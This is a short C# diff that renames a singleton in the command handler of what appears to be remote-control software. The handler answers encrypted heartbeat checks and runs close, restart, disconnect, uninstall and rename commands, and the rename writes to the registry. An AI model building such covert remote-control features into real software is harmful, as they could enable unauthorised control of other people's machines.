@@ -26,7 +26,7 @@ namespace bc.srv.Class
 
                 //CONTROLLO SERVER ATTIVO => RISPONDO I'M HERE
                 case "ARE YOU THERE?":
-                    var mm = new MsgManager(ST_Client.Instance.Connessione.GetStream());
+                    var mm = new MsgManager(SrvData.Instance.Connessione.GetStream());
                     mm.SendEncryMessage("I'M HERE", 5000);
                     break;
 
@@ -37,19 +37,19 @@ namespace bc.srv.Class
 
                 // COMANDO CHIUSURA SERVER                
                 case "BH_CLOSE_SERVER":
-                    ST_Client.Instance.Connessione.Close();
+                    SrvData.Instance.Connessione.Close();
                     Environment.Exit(0);
                     break;
 
                 // COMANDO RIAVVIO SERVER                
                 case "BH_RESTART_SERVER":
-                    ST_Client.Instance.Connessione.Close();
+                    SrvData.Instance.Connessione.Close();
                     Program.Restart();
                     break;
 
                 // COMANDO CHIUSURA CONNESSIONE             
                 case "BH_DISCONNECT_SERVER":
-                    ST_Client.Instance.isConnected = false;
+                    SrvData.Instance.isConnected = false;
                     break;
 
                 // COMANDO DISINSTALLAZIONE CONNESSIONE             
@@ -67,7 +67,7 @@ namespace bc.srv.Class
 
                 //COMANDO DI RINOMINA DEL SERVER
                 case "BH_RENAME_SERVER":
-                    ST_Client.Instance.ServerName = cmdPar[1];
+                    SrvData.Instance.ServerName = cmdPar[1];
 
                     var rm = new RegistryManager();
                     var td = new Text_Des();
